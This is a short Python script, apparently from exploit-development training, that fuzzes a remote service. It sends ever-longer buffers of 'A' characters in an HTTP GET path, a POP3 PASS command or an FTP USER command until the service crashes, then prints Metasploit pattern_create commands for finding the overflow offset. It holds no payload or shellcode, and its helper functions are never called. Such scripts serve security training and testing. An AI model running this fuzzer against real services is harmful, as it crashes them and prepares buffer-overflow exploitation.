#!/usr/bin/python

import argparse
import sys
import socket

from time import sleep

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')
parser.add_argument(
    '-i', '--increment', type=int, dest='increment', required=False, default=50,
    help='increase the size of the buffer by this much per attempt')

ap = parser.parse_args()
print("Sending buffer to " + ap.rhost + " " + str(ap.rport))


buf = '\x41' * ap.increment
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((ap.rhost, ap.rport))
        sent = s.send("GET /%" + buf + "\r\n\r\n")
        data = s.recv(1024)
        print("Sent buffer length " + str(len(buf)))
        s.close()
        sleep(2)
        buf += '\x41' * ap.increment
    except Exception:
        print("Check for crash in debugger. Find offset:")
        print("msf-pattern_create -l " + str(len(buf)))
        sys.exit()


def pop3_pass():
    buf = '\x41' * ap.increment
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ap.rhost, ap.rport))
            s.recv(1024)
            s.send("USER evildad \r\n")
            s.recv(1024)
            s.send("PASS " + buf + "\r\n")
            print("Sent buffer length " + str(len(buf)))
            s.close()
            sleep(1)
            buf += '\x41' * ap.increment
        except Exception:
            print("Check for crash in debugger. Find offset:")
            print("msf-pattern_create -l " + str(len(buf) - ap.increment))
            sys.exit()


def ftp_user():
    buf = '\x41' * ap.increment
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ap.rhost, ap.rport))
            s.recv(1024)
            s.send("USER" + buf + "\r\n")
            s.recv(1024)
            print("Sent buffer length " + str(len(buf)))
            s.close()
            sleep(1)
            buf += '\x41' * ap.increment
        except Exception:
            print("Check for crash in debugger. Find offset:")
            print(str(len(buf) - ap.increment))
            print("msf-pattern_create -l " + str(len(buf) - ap.increment))
            sys.exit()
